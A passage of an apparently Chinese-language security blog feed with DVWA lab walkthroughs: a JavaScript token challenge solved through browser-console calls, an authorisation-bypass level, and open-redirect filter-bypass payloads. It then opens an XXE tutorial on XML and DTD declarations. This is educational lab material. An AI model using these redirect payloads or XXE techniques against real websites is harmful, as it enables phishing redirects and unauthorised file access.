class="hljs-number">10</span>) | (key.<span class="hljs-title function_">charCodeAt</span>(++i) &amp; <span class="hljs-number">0x3ff</span>));<br>                    bytes[index++] = (<span class="hljs-number">0xf0</span> | (code &gt;&gt; <span class="hljs-number">18</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0x3f</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | ((code &gt;&gt; <span class="hljs-number">6</span>) &amp; <span class="hljs-number">0x3f</span>));<br>                    bytes[index++] = (<span class="hljs-number">0x80</span> | (code &amp; <span class="hljs-number">0x3f</span>))<br>                &#125;<br>            &#125;<br>            key = bytes<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (type === <span class="hljs-string">&#x27;object&#x27;</span>) &#123;<br>                <span class="hljs-keyword">if</span> (key === <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">ARRAY_BUFFER</span> &amp;&amp; key.<span class="hljs-property">constructor</span> === <span class="hljs-title class_">ArrayBuffer</span>) &#123;<br>                    key = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint8Array</span>(key)<br>                &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">isArray</span>(key)) &#123;<br>                    <span class="hljs-keyword">if</span> (!<span class="hljs-variable constant_">ARRAY_BUFFER</span> || !<span class="hljs-title class_">ArrayBuffer</span>.<span class="hljs-title function_">isView</span>(key)) &#123;<br>                        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>                    &#125;<br>                &#125;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-variable constant_">ERROR</span>)<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (key.<span class="hljs-property">length</span> &gt; <span class="hljs-number">64</span>) &#123;<br>            key = (<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sha256</span>(is224, <span class="hljs-literal">true</span>)).<span class="hljs-title function_">update</span>(key).<span class="hljs-title function_">array</span>()<br>        &#125;<br>        <span class="hljs-keyword">var</span> oKeyPad = [],<br>            iKeyPad = [];<br>        <span class="hljs-keyword">for</span> (i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; ++i) &#123;<br>            <span class="hljs-keyword">var</span> b = key[i] || <span class="hljs-number">0</span>;<br>            oKeyPad[i] = <span class="hljs-number">0x5c</span> ^ b;<br>            iKeyPad[i] = <span class="hljs-number">0x36</span> ^ b<br>        &#125;<br>        <span class="hljs-title class_">Sha256</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, is224, sharedMemory);<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>(iKeyPad);<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">oKeyPad</span> = oKeyPad;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">inner</span> = <span class="hljs-literal">true</span>;<br>        <span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedMemory</span> = sharedMemory<br>    &#125;<br>    <span class="hljs-title class_">HmacSha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Sha256</span>();<br>    <span class="hljs-title class_">HmacSha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">finalize</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>        <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">finalize</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">this</span>.<span class="hljs-property">inner</span>) &#123;<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-property">inner</span> = <span class="hljs-literal">false</span>;<br>            <span class="hljs-keyword">var</span> innerHash = <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">array</span>();<br>            <span class="hljs-title class_">Sha256</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">is224</span>, <span class="hljs-variable language_">this</span>.<span class="hljs-property">sharedMemory</span>);<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>(<span class="hljs-variable language_">this</span>.<span class="hljs-property">oKeyPad</span>);<br>            <span class="hljs-variable language_">this</span>.<span class="hljs-title function_">update</span>(innerHash);<br>            <span class="hljs-title class_">Sha256</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">finalize</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>)<br>        &#125;<br>    &#125;;<br>    <span class="hljs-keyword">var</span> <span class="hljs-built_in">exports</span> = <span class="hljs-title function_">createMethod</span>();<br>    <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha256</span> = <span class="hljs-built_in">exports</span>;<br>    <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha224</span> = <span class="hljs-title function_">createMethod</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha256</span>.<span class="hljs-property">hmac</span> = <span class="hljs-title function_">createHmacMethod</span>();<br>    <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha224</span>.<span class="hljs-property">hmac</span> = <span class="hljs-title function_">createHmacMethod</span>(<span class="hljs-literal">true</span>);<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">COMMON_JS</span>) &#123;<br>        <span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = <span class="hljs-built_in">exports</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        root.<span class="hljs-property">sha256</span> = <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha256</span>;<br>        root.<span class="hljs-property">sha224</span> = <span class="hljs-built_in">exports</span>.<span class="hljs-property">sha224</span>;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable constant_">AMD</span>) &#123;<br>            <span class="hljs-title function_">define</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-built_in">exports</span><br>            &#125;)<br>        &#125;<br>    &#125;<br>&#125;)();<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">do_something</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> t = <span class="hljs-string">&quot;&quot;</span>, n = e.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; n &gt;= <span class="hljs-number">0</span>; n--) t += e[n];<br>    <span class="hljs-keyword">return</span> t<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_3</span>(<span class="hljs-params">t, y = <span class="hljs-string">&quot;ZZ&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> + y)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_2</span>(<span class="hljs-params">e = <span class="hljs-string">&quot;YY&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(e + <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_1</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">do_something</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>)<br>&#125;, <span class="hljs-number">300</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;send&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, token_part_3);<br><span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);<br></code></pre></td></tr></table></figure><p>我们可以直接看核心部分：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">do_something</span>(<span class="hljs-params">e</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">var</span> t = <span class="hljs-string">&quot;&quot;</span>, n = e.<span class="hljs-property">length</span> - <span class="hljs-number">1</span>; n &gt;= <span class="hljs-number">0</span>; n--) t += e[n];<br>    <span class="hljs-keyword">return</span> t<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_3</span>(<span class="hljs-params">t, y = <span class="hljs-string">&quot;ZZ&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> + y)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_2</span>(<span class="hljs-params">e = <span class="hljs-string">&quot;YY&quot;</span></span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">sha256</span>(e + <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">token_part_1</span>(<span class="hljs-params">a, b</span>) &#123;<br>    <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;token&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-title function_">do_something</span>(<span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span>)<br>&#125;<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;phrase&quot;</span>).<span class="hljs-property">value</span> = <span class="hljs-string">&quot;&quot;</span>;<br><span class="hljs-built_in">setTimeout</span>(<span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>    <span class="hljs-title function_">token_part_2</span>(<span class="hljs-string">&quot;XX&quot;</span>)<br>&#125;, <span class="hljs-number">300</span>);<br><span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&quot;send&quot;</span>).<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&quot;click&quot;</span>, token_part_3);<br><span class="hljs-title function_">token_part_1</span>(<span class="hljs-string">&quot;ABCD&quot;</span>, <span class="hljs-number">44</span>);<br></code></pre></td></tr></table></figure><p>function token_part_3(t, y = "ZZ")、function token_part_2(e = "YY")、functiontoken_part_1(a, b) 都是对token进行加密处理</p><p>执行步骤为：</p><p>1、将id="phrase"输入框的值置空 document.getElementById("phrase").value = "";</p><p>2、调用token_part_1() 方法 token_part_1("ABCD", 44);</p><p>3、执行 token_part_2() 方法</p><p>setTimeout(function() {</p><p>token_part_2("XX")</p><p>}, 300);</p><p>4、执行token_part_3() 方法 document.getElementById("send").addEventListener("click", token_part_3);</p><p>因为token_part_2()方法延迟了3秒执行所以在延迟执行的过程中token_part_1()方法会优先执行<br>ok思路理清后开始操作：</p><p>将输入框的值改为success</p><p>在前端控制台依次执行   token_part_1("ABCD", 44);    token_part_2("XX");</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20100855.png" alt="屏幕截图 2024-02-23 100855"></p><p>然后提交即可</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20100905.png" alt="屏幕截图 2024-02-23 100905"></p><h3 id="4-Impossible-13"><a href="#4-Impossible-13" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>页面提示如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20101202.png" alt="屏幕截图 2024-02-23 101202"></p><p>大致意思是：你永远不能相信来自用户的任何东西，或者阻止他们破坏它，但是你又不能阻止用户的输入因为这样可能会干扰网站的正常使用，所以不存在Impossible级别</p><h2 id="十五、Authorisation-Bypass"><a href="#十五、Authorisation-Bypass" class="headerlink" title="十五、Authorisation Bypass"></a>十五、Authorisation Bypass</h2><p>授权绕过（Authorization Bypass）是指在计算机系统中绕过正常的授权机制，未经授权就访问系统资源的行为。这通常涉及到利用系统漏洞、配置错误或安全策略的弱点，以非法方式获取对敏感数据、应用程序或系统的访问权限</p><h3 id="1-Low-14"><a href="#1-Low-14" class="headerlink" title="1.Low"></a>1.Low</h3><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20113341.png" alt="屏幕截图 2024-02-23 113341"></p><p>进入页面显示</p><p>此页面只能由管理员用户访问。您面临的挑战是使用其他用户之一访问这些功能，例如gordonb/abc 123</p><p>然后我们重新打开一个没登录过的dvwa然后使用他给我们的账密gordonb/abc 123进行登录</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202024-02-23%20113257.png" alt="屏幕截图 2024-02-23 113257"></p><p>我们发现用户是没有授权绕过这一选项的</p><h2 id="十六、Vulnerability-Open-HTTP-Redirect"><a href="#十六、Vulnerability-Open-HTTP-Redirect" class="headerlink" title="十六、Vulnerability: Open HTTP Redirect"></a>十六、Vulnerability: Open HTTP Redirect</h2><h3 id="1-Low-15"><a href="#1-Low-15" class="headerlink" title="1.Low"></a>1.Low</h3><p>先看源码如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223105245195.png" alt="image-20240223105245195"></p><p>先通过 array_key_exists 函数判断 $_GET 数组中是否存在 redirect 键值，如果存在且不为空，则调用 header 函数，否则返回 500 状态码然后调用 header 函数，将 Location 字段设置为  $ GET[‘redirect’] 的值，完成重定向操作。exit 函数用于终止脚本的执行，确保 header 函数的执行效果<br>由于源码没有对重定向参数传递进行任何过滤</p><p>因此构造Payload：<br><code>?redirect=跳转网页URL</code></p><h3 id="2-Medium-14"><a href="#2-Medium-14" class="headerlink" title="2.Medium"></a>2.Medium</h3><p>先分析源码</p><p>如图：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223110340580.png" alt="image-20240223110340580"></p><p>此关代码与上一关的主要不同的点在于使用了正则匹配</p><p>正则表达式 preg_match 来检查 $_GET[‘redirect’] 的值是否以 “http://” 或 “https://” 开头且不区分大小写<br>如果匹配到了这两个前缀会返回 HTTP 响应码 500并输出提示信息 " Absolute URLs not allowed "然后程序终止执行<br>如果没有匹配到绝对 URL 的前缀，即以相对路径形式存在，将执行接下来的代码<br>使用 header 函数将浏览器重定向到 $ GET[‘redirect’] 指定的地址<br>执行 exit 终止后续代码的执行</p><p>因此我们可以使用 JavaScript 进行重定向或者创建一个中间代理页面</p><p>以下是一个示例 JavaScript 代码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span><br><span class="language-javascript">    <span class="hljs-keyword">var</span> redirectURL = <span class="hljs-string">&quot;http://www.example.com&quot;</span>; <span class="hljs-comment">// 设置要重定向的网页地址</span></span><br><span class="language-javascript">    <span class="hljs-variable language_">window</span>.<span class="hljs-property">location</span>.<span class="hljs-property">href</span> = redirectURL; <span class="hljs-comment">// 执行重定向</span></span><br><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></td></tr></table></figure><p>将上述代码插入到编辑器的代码中，加载该网页时，JavaScript 代码会将用户重定向到指定的网页。</p><h3 id="3-High-14"><a href="#3-High-14" class="headerlink" title="3.High"></a>3.High</h3><p>代码分析：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223112120772.png" alt="image-20240223112120772"></p><p>此关与上一关的不同点在于</p><p>检查 $_GET['redirect'] 参数中是否包含字符串 “info.php”。这里使用了 strpos() 函数来检查字符串中是否包含指定的内容</p><p>如果 $_GET['redirect'] 参数包含字符串 “info.php”，则使用 header() 函数进行重定向，将用户重定向到 $GET['redirect'] 中指定的页面</p><p>如果 $_GET['redirect'] 参数不包含字符串 “info.php”，则返回 HTTP 响应码 500（服务器内部错误）并输出一段提示信息：“You can only redirect to the info page.”</p><p>如果没有传递 “redirect” 参数，或者其值为空，则同样返回 HTTP 响应码 500，并输出另一段提示信息：“Missing redirect target.”</p><p>则在构造参数时是指包含字符串info.php即可<br>payload：<code>?redirect=https//www.baidu.com/?redirect=info.php</code></p><h3 id="4-Impossible-14"><a href="#4-Impossible-14" class="headerlink" title="4.Impossible"></a>4.Impossible</h3><p>源码：</p><p><img src="https://gitee.com/dvvss/images/raw/master/imags/image-20240223112410077.png" alt="image-20240223112410077"></p><p>其实这关就是设置了白名单他只允许传入参数的值为他指定的其余的均无效</p><p>OVER！</p>]]></content>
    
    
    
    <tags>
      
      <tag>靶场</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2024/04/25/XXE/"/>
    <url>/2024/04/25/XXE/</url>
    
    <content type="html"><![CDATA[<h1 id="XXE漏洞知识及ctfshow例题"><a href="#XXE漏洞知识及ctfshow例题" class="headerlink" title="XXE漏洞知识及ctfshow例题"></a>XXE漏洞知识及ctfshow例题</h1><h2 id="XXE漏洞相关知识"><a href="#XXE漏洞相关知识" class="headerlink" title="XXE漏洞相关知识"></a>XXE漏洞相关知识</h2><p>XXE全称为XML Enternal Entity Injection 中文叫xml外部实体注入</p><h3 id="什么是xml"><a href="#什么是xml" class="headerlink" title="什么是xml"></a>什么是xml</h3><p>简单了解XML：</p><p>（xml和html的区别可以简易的理解成：xml是用来储存数据和传输数据的而html是用来将数据展现出来）</p><p>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML <strong>被设计为传输和存储数据</strong>，其焦点是数据的内容 XML 被设计用来结构化、存储以及传输信息<br>XML 允许创作者定义自己的标签和自己的文档结构<br>语法：</p><p>XML元素都必须有关闭标签<br>XML 标签对大小写敏感<br>XML 必须正确地嵌套<br>XML 文档必须有根元素<br>XML 的属性值须加引号<br>结构：</p><p>XML 文档声明，在文档的第一行<br>XML 文档类型定义，即DTD，XXE 漏洞所在的地方<br>XML 文档元素<br>例子：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-comment">&lt;!--说明了xml文档的版本还有编码类型 经常出现在xml文档的开头--&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">userConfig</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>john_doe<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>secretpassword<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">language</span>&gt;</span>en_US<span class="hljs-tag">&lt;/<span class="hljs-name">language</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">theme</span>&gt;</span>dark<span class="hljs-tag">&lt;/<span class="hljs-name">theme</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span>jane_smith<span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span>anotherpassword<span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">language</span>&gt;</span>fr_FR<span class="hljs-tag">&lt;/<span class="hljs-name">language</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">theme</span>&gt;</span>light<span class="hljs-tag">&lt;/<span class="hljs-name">theme</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">userConfig</span>&gt;</span><br></code></pre></td></tr></table></figure><p>在xml文档中注释是使用<!--注释-->进行注释</p><p>以上是一个简单的xml文档其中的<userConfig>元素中嵌套着<user>；<user>中嵌套着<username> <password> <language> <theme>这些元素</p><p>而这些元素其中的jane_smith则为这个xml文档中储存的数据</p><p>（</p><p>为什么都有数据库了还要用xml来储存数据 ：我个人认为是因为数据库对于我们来说可读性不高因为可能都是经过加密或者编码后的而xml相对来说可读性就很高便于人识别，经常用来当作配置文件</p><p>以下是一些使用 XML 的情况：</p><ol><li><p><strong>数据交换格式</strong>：XML 是一种通用的数据交换格式，在不同系统之间传递数据时非常有用。许多 Web 服务和 API 使用 XML 作为数据格式来传输数据。</p></li><li><p><strong>配置文件</strong>：XML 被广泛用于配置文件中，例如在 Web 应用程序、桌面应用程序和服务器软件中。XML 的结构化特性和可读性使其非常适合用于表示配置信息。</p></li><li><p><strong>文档存储</strong>：对于一些具有层次结构的数据，如文档、报告或配置文件，XML 可以提供一种简单的、易于理解的存储格式。某些情况下，将这些数据存储为 XML 文件可能比使用数据库更合适。</p></li><li><p><strong>面向文本的数据</strong>：如果数据的主要形式是文本，而不是结构化数据，那么将其存储为 XML 文件可能更加合适。XML 具有自我描述性，因此即使在没有其他说明的情况下，也可以轻松地理解数据的结构和内容。</p></li><li><p><strong>支持分散的数据存储</strong>：在一些分散式系统中，每个组件都可能需要维护自己的数据存储。在这种情况下，XML 可以作为一种轻量级的、独立的数据存储格式，允许每个组件在不依赖中央数据库的情况下管理自己的数据</p><p>）</p></li></ol><h3 id="DTD（文档类型定义）"><a href="#DTD（文档类型定义）" class="headerlink" title="DTD（文档类型定义）"></a>DTD（文档类型定义）</h3><p>dtd通常在xml文档中在 XML 中，可以使用 DTD 来定义以下内容：</p><ol><li><strong>元素的结构和关系</strong>：DTD 可以定义 XML 文档中的元素以及它们之间的层次结构和关系。这包括定义元素的名称、元素可以包含的子元素、子元素的顺序和数量等信息。</li><li><strong>元素的属性</strong>：DTD 可以定义元素可以具有的属性，包括属性的名称、数据类型、取值范围等信息。</li><li><strong>实体</strong>：DTD 还可以声明实体，用于在 XML 文档中定义可重复使用的文本片段或字符。这样可以使 XML 文档更具可读性和可维护性。</li><li><strong>CDATA 部分</strong>：DTD 可以定义 CDATA（Character Data，字符数据）部分，用于包含文本数据而不进行 XML 解析。CDATA 部分通常用于包含特殊字符或者大段文本数据。</li></ol><p>通过使用 DTD，可以为 XML 文档定义结构和约束，以确保文档的有效性和一致性。DTD 可以内联在 XML 文档中，也可以作为单独的文件引用</p><p>例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">bookstore</span> [</span><br><span class="hljs-meta">    &lt;!-- 定义书籍元素 括号中是book元素的子元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">book</span> (<span class="hljs-keyword">title</span>, <span class="hljs-keyword">author</span>, <span class="hljs-keyword">year</span>, <span class="hljs-keyword">price</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义标题元素 其中#PCDATA表示这些元素可以包含文本数据 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">title</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义作者元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">author</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义出版年份元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">year</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义价格元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">price</span> (<span class="hljs-keyword">#PCDATA</span>)&gt;</span></span><br><span class="hljs-meta">    </span><br><span class="hljs-meta">    &lt;!-- 定义书店元素 --&gt;</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">bookstore</span> (<span class="hljs-keyword">book</span>+)&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br></code></pre></td></tr></table></figure><h3 id="DTD声明"><a href="#DTD声明" class="headerlink" title="DTD声明"></a>DTD声明</h3><p>dtd声明可以分为外部声明和内部声明</p><p>外部声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">note</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;flag.php&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>其中的SYSTEM可以理解成他会把在它后边的内容理解成一个合法的系统标识，从而找到文件的位置</p><p>内部声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">bookstore</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">bookstore</span> (<span 